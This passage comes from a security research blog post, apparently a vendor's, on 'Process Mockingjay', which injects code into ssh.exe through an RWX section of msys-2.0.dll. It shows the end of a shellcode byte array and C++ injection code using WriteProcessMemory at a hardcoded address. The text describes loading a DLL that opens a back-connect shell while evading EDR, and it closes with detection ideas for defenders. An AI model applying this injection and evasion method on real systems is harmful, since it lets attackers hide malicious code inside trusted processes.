    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
    "\x4c\x8d\x85\x0b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
    "\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x4a\x4f\x45\x53\x21\x00"
    "\x41\x6c\x65\x72\x74\x00";  
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
    pi.dwProcessId);
    if (hProcess == nullptr) {  
        printf("[x] ReadProcessMemory failed with status 0x%x\n",
        ::GetLastError());  
        return 1;  
    }  
    
    if (!DebugActiveProcess(4236)) {  
        printf("[x] DebugActiveProcess failed with status 0x%x\n",
        ::GetLastError());  
        ::CloseHandle(hProcess);  return 1;  
    }  SIZE_T bytesWritten = 0;
    
    if (!WriteProcessMemory(hProcess, (LPVOID)0x21022D120, buf,
    sizeof(buf), &amp;bytesWritten)) {  
        printf("[x] WriteProcessMemory failed with status 0x%x\n",
        ::GetLastError());
    }</span></span></pre></div><div type="code_block" data-hook="rcv-block97"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7hv5m"><span class="akGp8"><span>Once our code has been successfully written into the Read-Write-Execute (RWX) section of the ssh.exe process's memory, we can patiently wait for the execution flow of ssh.exe to naturally reach the RWX section and execute our injected code. It is important to note that in this specific case, the targeted DLL does not employ Address Space Layout Randomization (ASLR), which means the address of the RWX section remains consistent and can be hardcoded in the payload. Thus, there is no need to dynamically resolve the address of the targeted section during runtime. </span></span></p></div><div type="paragraph" data-hook="rcv-block98"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-8ic5u"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block99"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-4epra"><span class="akGp8"><span>For the purposes of the proof of concept, the injected shellcode in the ssh.exe process attempts to load an additional DLL named MyLibrary.dll into memory. This DLL was designed to establish a back connect shell session with an external machine. However, it's important to note that the functionality of this DLL can be customized to execute any desired operation based on the developer's intention.</span></span></p></div><div type="paragraph" data-hook="rcv-block100"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-19uo8"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block101"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-11ptl"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block102"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-fta0p"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="LZwXu"><div style="--dim-height:863;--dim-width:1763;--ricos-image-default-border-color:unset" id="fta0p" class="s6q7U EjY43 N8UDE" data-hook="image-viewer-fta0p"><wow-image id="e17082_1c34a4c2b0c74b97b4dd22a0624dcdd2~mv2.png" class="undefined lhz4O" data-image-info="{&quot;containerId&quot;:&quot;fta0p&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1763,&quot;height&quot;:863,&quot;uri&quot;:&quot;e17082_1c34a4c2b0c74b97b4dd22a0624dcdd2~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG fta0p" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/e17082_1c34a4c2b0c74b97b4dd22a0624dcdd2~mv2.png/v1/fill/w_49,h_24,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/e17082_1c34a4c2b0c74b97b4dd22a0624dcdd2~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution" data-pin-media="https://static.wixstatic.com/media/e17082_1c34a4c2b0c74b97b4dd22a0624dcdd2~mv2.png/v1/fill/w_1763,h_863,al_c,q_90/e17082_1c34a4c2b0c74b97b4dd22a0624dcdd2~mv2.png" draggable="false"></wow-image></div><button class="TmdpQ" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="FuKsb"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block103"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-dised"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block104"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-9pp54"><span class="akGp8"><span>After conducting extensive tests, our method has proven to be a highly successful solution for injecting and executing code in a remote process that uses the DLL msys-2.0.dll. In this case, we were able to inject our own code into the memory space of the ssh.exe process without being detected by the EDR.</span></span></p></div><div type="paragraph" data-hook="rcv-block105"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7opdf"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block106"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-at7fq"><span class="akGp8"><span>The uniqueness of this technique lies in the fact that there is no need to allocate memory, set permissions or create a new thread within the target process to initiate the execution of our injected code. This differentiation sets this strategy apart from other existing techniques and makes it challenging for Endpoint Detection and Response (EDR) systems to detect this method.</span></span></p></div><div type="paragraph" data-hook="rcv-block107"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-4m87l"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block108"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-5fc8f"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="LZwXu"><div style="--dim-height:1053;--dim-width:1866;--ricos-image-default-border-color:unset" id="5fc8f" class="s6q7U EjY43 N8UDE" data-hook="image-viewer-5fc8f"><wow-image id="e17082_0308d35426894e12b08fcf825193960e~mv2.png" class="undefined lhz4O" data-image-info="{&quot;containerId&quot;:&quot;5fc8f&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1866,&quot;height&quot;:1053,&quot;uri&quot;:&quot;e17082_0308d35426894e12b08fcf825193960e~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 5fc8f" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/e17082_0308d35426894e12b08fcf825193960e~mv2.png/v1/fill/w_49,h_28,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/e17082_0308d35426894e12b08fcf825193960e~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution" data-pin-media="https://static.wixstatic.com/media/e17082_0308d35426894e12b08fcf825193960e~mv2.png/v1/fill/w_1866,h_1053,al_c,q_95/e17082_0308d35426894e12b08fcf825193960e~mv2.png" draggable="false"></wow-image></div><button class="TmdpQ" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="FuKsb"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block109"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-70u1d"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block110"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-dsac"><span class="akGp8"><span>Notably the injected shellcode seamlessly loaded an additional DLL and created a remote shell within the ssh.exe process, as shown in the previous image, all while evading detection mechanisms. This successful demonstration highlights the effectiveness and discretion of our method in achieving the desired outcome without raising suspicion.</span></span></p></div><div type="paragraph" data-hook="rcv-block111"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bo7bi"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block112"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-ahqll"><span class="akGp8"><span>The complete process to achieve this can be summarized as follows: </span></span></p></div><div type="paragraph" data-hook="rcv-block113"></div><div data-breakout="normal"><ol class="Dphjj nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-a9h9v"><span class="akGp8"><span>Custom application is executed. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-fb8mm"><span class="akGp8"><span>Trusted application (ssh.exe) using DLL msys-2.0.dll is launched as a child process. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-5mohg"><span class="akGp8"><span>Custom application opens a handle to the target process (ssh.exe). </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-9kcmm"><span class="akGp8"><span>Code to be injected is copied into the RWX section of msys-2.0.dll. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-b3q30"><span class="akGp8"><span>Trusted application executes the injected code during its normal execution flow. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-96aml"><span class="akGp8"><span>Additional DLL MyLibrary.dll is loaded by the shellcode injected in the RWX section.</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-4ifi0"><span class="akGp8"><span>Back connect shell session is stablished.</span></span></p></li></ol></div><div type="ordered_list" data-hook="rcv-block114"></div><div data-breakout="normal"><h3 class="Tu1-z AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-agrns"><span class="qKwSW"><span>PoC Video</span></span></h3></div><div type="heading" data-hook="rcv-block115"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-2orqv"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-VIDEO"><div class="wvqrI" data-hook="video-player"><div><div style="width:100%;height:100%" data-loaded="true" class="m5isz"><div style="width:100%;height:100%"><div loading="lazy"></div></div></div></div></div></figure></div></div></div><div type="video" data-hook="rcv-block116"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-aij6d"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block117"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cjmjg"><span class="akGp8"><span>For more videos, visit our </span><a target="_blank" href="https://www.youtube.com/channel/UCKGsU_r_nw9TdQYYHbhxD_A" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>YouTube Channel</span></u></a><span>.</span></span></p></div><div type="paragraph" data-hook="rcv-block118"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-6kehc"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block119"></div><div data-breakout="normal"><h3 class="Tu1-z AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-au0ac"><span class="qKwSW"><span>Security Implications</span></span></h3></div><div type="heading" data-hook="rcv-block120"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-9qe1q"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block121"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-1q965"><span class="akGp8"><span>As mentioned earlier in this research paper, attackers may utilize this technique to circumvent detection by EDRs or antivirus software by evading userland hooks and injecting malicious code into the process space of trusted software. In the proof of concept demonstrated in this blog post, the vulnerable DLL that was exploited for injection was msys-2.0.dll. However, it is important to note that there are potentially numerous other DLLs that share similar characteristics, making the detection of this behavior even more challenging.</span></span></p></div><div type="paragraph" data-hook="rcv-block122"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-e21on"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block123"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-brs6e"><span class="akGp8"><span>To effectively counteract such attacks, security solutions need to employ a comprehensive and proactive approach that goes beyond static monitoring of specific DLLs or system calls. Behavioral analysis, anomaly detection, and machine learning techniques can enhance the ability to identify process injection techniques and detect malicious activities within the memory space of trusted processes.</span></span></p></div><div type="paragraph" data-hook="rcv-block124"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-dtu24"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block125"></div><div data-breakout="normal"><h3 class="Tu1-z AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-9hjb7"><span class="qKwSW"><span>Detection Opportunities</span></span></h3></div><div type="heading" data-hook="rcv-block126"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-c1rdp"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block127"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-c9mpr"><span class="akGp8"><span>We provide the following set of ideas to the infosec community to help hunting this threat on your environments, feel free to test them and improve them if required. </span></span></p></div><div type="paragraph" data-hook="rcv-block128"></div><div data-breakout="normal"><ol class="Dphjj nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-6edl4"><span class="akGp8"><span>Look for GNU utilities launched by suspicious or uncommon processes. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-aqvio"><span class="akGp8"><span>Look for network connections to non-standard ports from processes such as </span><strong style="font-weight:700"><span>ssh.exe</span></strong><span> or any other GNU utility. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-fd684"><span class="akGp8"><span>Maintain a database of DLLs that exhibit such characteristics and identify any loading attempts made by non-legitimate processes. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-88mnk"><span class="akGp8"><span>Employ reputation-based systems that assign trust levels to DLLs, considering factors such as the source of the DLL, digital certificates, historical behavior, and the characteristics of its sections. </span></span></p></li></ol></div><div type="ordered_list" data-hook="rcv-block129"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-5gki3"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block130"></div><div data-breakout="normal"><h2 class="AQ4-j AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-fkqi"><span class="qKwSW"><span>Conclusions</span></span></h2></div><div type="heading" data-hook="rcv-block131"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-8ml49"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block132"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cpie2"><span class="akGp8"><span>This research has provided valuable insights into the utilization of legitimate DLLs with Read-Write-Execute (RWX) sections as an effective method for evading userland hooks and injecting code into remote processes. By leveraging trusted libraries with these attributes, threat actors can bypass the need to allocate RWX memory, set permissions, or even create new threads in the target process. These findings underscore the critical importance of implementing comprehensive defense strategies to combat such advanced evasion techniques. Organizations should employ dynamic analysis techniques to detect and analyze runtime behaviors, leverage behavioral analysis to identify anomalous activities, utilize signature-based detection for known malicious patterns, implement reputation-based systems to flag suspicious files or activities, and establish robust memory protection mechanisms to prevent unauthorized code execution.</span></span></p></div><div type="paragraph" data-hook="rcv-block133"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-9kcoo"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block134"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-3s9jh"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block135"></div><div data-breakout="normal"><h2 class="AQ4-j AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-9cdke"><span class="qKwSW"><br role="presentation"></span></h2></div><div type="empty-line" data-hook="rcv-block136"></div></div><div type="last" data-hook="rcv-block-last"></div></div></div></div></div></div></section></div></article></div></div></div><div class="zp8IQu zp8s_J"><div><section class="oY1ew3" data-hook="recent-posts" style="--blog-pl-common-padding-top:28px;--blog-pl-common-padding-bottom:25px;--blog-pl-slider-padding-top:16px;--blog-pl-slider-padding-bottom:24px;--blog-pl-header-height:34px;--blog-pl-header-margin-bottom:18px;--blog-pl-footer-content-height:18px;--blog-pl-footer-separator-margin:15px;--blog-pl-footer-padding-top:8px;--blog-pl-common-title-margin:11px;--blog-pl-default-title-margin:10px;--blog-pl-slider-title-margin-top:10px;--blog-pl-category-label-margin-bottom:12px;--blog-pl-slider-category-label-margin-bottom:2px"><section><div class="zHLEBV"><article class="qbu2Gh" data-hook="recent-post-list-item"><div class="dkbPQd"><a aria-label="OpenClaw MDR Detections" href="https://www.securityjoes.com/post/hunting-openclaw-detection-and-containment-guidance-for-defenders" class="blog-link-hover-color" data-hook="link" tabindex="-1"><div class="kkOpHH"><wow-image class="TI1b5D HNM0p2" data-image-info="{&quot;displayMode&quot;:&quot;fill&quot;,&quot;targetWidth&quot;:450,&quot;targetHeight&quot;:253,&quot;isSEOBot&quot;:false,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1313,&quot;height&quot;:1015,&quot;uri&quot;:&quot;e17082_09dab0564ea64077b7f8391cd314ad86~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG undefined" data-bg-effect-name="" data-has-ssr-src="" style="--wix-img-max-width:max(1313px, 100%)"><img alt="OpenClaw MDR Detections" data-pin-nopin="true"></wow-image></div></a><div class="ZnRZP5"></div></div></article><article class="qbu2Gh" data-hook="recent-post-list-item"><div class="dkbPQd"><a aria-label="LazarOps: APT Tactics Targeting the Developers Supply Chain [PART 1]" href="https://www.securityjoes.com/post/operation-lazarops-over-50-github-accounts-tied-to-lazarus-fake" class="blog-link-hover-color" data-hook="link" tabindex="-1"><div class="kkOpHH"><wow-image class="TI1b5D HNM0p2" data-image-info="{&quot;displayMode&quot;:&quot;fill&quot;,&quot;targetWidth&quot;:450,&quot;targetHeight&quot;:253,&quot;isSEOBot&quot;:false,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1024,&quot;height&quot;:873,&quot;uri&quot;:&quot;e17082_c23422c687d54ba084a6d89ddd939173~mv2.jpg&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG undefined" data-bg-effect-name="" data-has-ssr-src="" style="--wix-img-max-width:max(1024px, 100%)"><img alt="LazarOps: APT Tactics Targeting the Developers Supply Chain [PART 1]" data-pin-nopin="true"></wow-image></div></a><div class="ZnRZP5"></div></div></article><article class="qbu2Gh" data-hook="recent-post-list-item"><div class="dkbPQd"><a aria-label="Security's Achilles' Heel: Vulnerable Drivers on the Prowl" href="https://www.securityjoes.com/post/security-s-achilles-heel-vulnerable-drivers-on-the-prowl" class="blog-link-hover-color" data-hook="link" tabindex="-1"><div class="kkOpHH"><wow-image class="TI1b5D HNM0p2" data-image-info="{&quot;displayMode&quot;:&quot;fill&quot;,&quot;targetWidth&quot;:450,&quot;targetHeight&quot;:253,&quot;isSEOBot&quot;:false,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1276,&quot;height&quot;:843,&quot;uri&quot;:&quot;d03b6f_e486ca25d0664c53b4a512f0b48ef1b8~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG undefined" data-bg-effect-name="" data-has-ssr-src="" style="--wix-img-max-width:max(1276px, 100%)"><img alt="Security's Achilles' Heel: Vulnerable Drivers on the Prowl" data-pin-nopin="true"></wow-image></div></a><div class="ZnRZP5"></div></div></article></div></section></section></div></div><div></div></div></div></div><div data-hook="tooltip-portal"></div></div></div></div></div></div></div><!--/$--></div></div></section><!--/$--></div></div></div><!--/$--></div></div></div></div></main><!--$--><div id="soapAfterPagesContainer" class="page-without-sosp soapAfterPagesContainer page-without-sosp"><div data-mesh-id="soapAfterPagesContainerinlineContent" data-testid="inline-content" class=""><div data-mesh-id="soapAfterPagesContainerinlineContent-gridContainer" data-testid="mesh-container-content"><!--$--><div id="CONTROLLER_COMP_CUSTOM_ID" style="display:none"></div><!--/$--></div></div></div><!--/$--><div id="pinnedBottomRight" class="pinnedBottomRight"><!--$--><div id="comp-laf6v82o-pinned-layer" class="comp-laf6v82o-pinned-layer big2ZD"><!--$--><div id="comp-laf6v82o" class="OQ8Tzd comp-laf6v82o pvlz2w"><div class="nKphmK" title="Wix Chat" aria-label="Wix Chat" scrolling="no" allowfullscreen="" allowtransparency="true" allowvr="true" frameborder="0" allow="clipboard-write;autoplay;camera;microphone;geolocation;vr" data-original-tag="iframe"></div></div><!--/$--></div><!--/$--></div></div></div><div id="SCROLL_TO_BOTTOM" class="Vd6aQZ ignore-focus SCROLL_TO_BOTTOM" role="region" tabindex="-1" aria-label="bottom of page"><span class="mHZSwn">bottom of page</span></div></div></div>


    
    

    
        
    

    <!-- Polyfills check -->
    


<!-- initCustomElements # 1-->






<!-- preloading pre-scripts -->

    
    <link href="https://siteassets.parastorage.com/pages/pages/thunderbolt?appDefinitionIdToSiteRevision=%7B%2214271d6f-ba62-d045-549b-ab972ae1f70e%22%3A%2225%22%2C%2214bcded7-0066-7c35-14d7-466cb3f09103%22%3A%221335%22%2C%221522827f-c56c-a5c9-2ac9-00f9e6ae12d3%22%3A%221903%22%7D&amp;beckyExperiments=.DatePickerPortal%2C.DisableDocumentScrollWhenLightBoxOpen%2C.EnableCustomCSSVarsForLoginSocialBar%2C.FreemiumBannerOdeditor%2C.LoginBarEnableLoggingInStateInSSR%2C.TextInputAutoFillFix%2C.UseLoginSocialBarCustomMenu%2C.UseNewLoginSocialBarCustomMenuPositioning%2C.UseNewLoginSocialBarElementStructure%2C.UseNewLoginSocialBarMemberInitialsAvatar%2C.VerticalMenu_uiType_NativeMapper%2C.WixFreeSiteBannerDesktop%2C.WixFreeSiteBannerMobile%2C.buttonUdp%2C.calculateCollapsibleTextLineHeightByFont%2C.disableBuilderWixComponents%2C.dom_store%2C.dynamicSlots%2C.fiveGridLineStudioSkins%2C.imageEncodingAVIF%2C.isClassNameToRootEnabled%2C.motionTimeAnimationsCSS%2C.propsCarmiMappersMigration1%2C.propsCarmiMappersMigration4%2C.propsCarmiMappersMigration5%2C.shouldUseResponsiveImages%2C.svgResolver_2%2C.takeAppDependenciesFromCSM%2C.updateRichTextSemanticClassNamesOnCorvid%2C.useClassnameInResponsiveAppWidget%2C.useImageAvifFormatInNativeProGallery%2C.useResponsiveImgClassicFixed%2C.useSvgLoaderFeature%2C.useSvgLoaderFeatureOnBuilderComps&amp;blocksBuilderManifestGeneratorVersion=1.129.0&amp;contentType=application%2Fjson&amp;deviceType=Desktop&amp;dfCk=6&amp;dfVersion=1.5263.0&amp;disableStaticPagesUrlHierarchy=false&amp;editorName=Unknown&amp;experiments=dm_bgScrubToMotionFixer%2Cdm_masterPageVariablesQueryFixer%2Cdm_migrateOldHoverBoxToNewFixer&amp;externalBaseUrl=https%3A%2F%2Fwww.securityjoes.com&amp;fileId=62b974ff.bundle.min&amp;formFactor=desktop&amp;hasTPAWorkerOnSite=false&amp;hasUserDomainMedia=false&amp;isBuilderComponentModel=false&amp;isHttps=true&amp;isInSeo=false&amp;isMultilingualEnabled=false&amp;isPremiumDomain=true&amp;isTrackClicksAnalyticsEnabled=true&amp;isUrlMigrated=true&amp;isWixCodeOnPage=false&amp;isWixCodeOnSite=false&amp;language=en&amp;languageResolutionMethod=QueryParam&amp;metaSiteId=12d3ac93-e1a2-541e-3590-55a7b02b9834&amp;module=thunderbolt-features&amp;oneDocEnabled=true&amp;originalLanguage=en&amp;pageId=e17082_a0d5cfc3660cf24eef03e6e90553fc18_752.json&amp;pilerExperiments=specs.piler.useEditorReactComponents&amp;quickActionsMenuEnabled=false&amp;registryLibrariesTopology=%5B%7B%22artifactId%22%3A%22editor-elements%22%2C%22namespace%22%3A%22wixui%22%2C%22url%22%3A%22https%3A%2F%2Fstatic.parastorage.com%2Fservices%2Feditor-elements%2F1.14878.0%22%7D%2C%7B%22artifactId%22%3A%22editor-elements%22%2C%22namespace%22%3A%22dsgnsys%22%2C%22url%22%3A%22https%3A%2F%2Fstatic.parastorage.com%2Fservices%2Feditor-elements%2F1.14878.0%22%7D%5D&amp;remoteWidgetStructureBuilderVersion=1.251.0&amp;siteId=1d0e4403-afd6-4d82-bf81-e06ad560def4&amp;siteRevision=752&amp;staticHTMLComponentUrl=https%3A%2F%2Fwww-securityjoes-com.filesusr.com%2F&amp;useS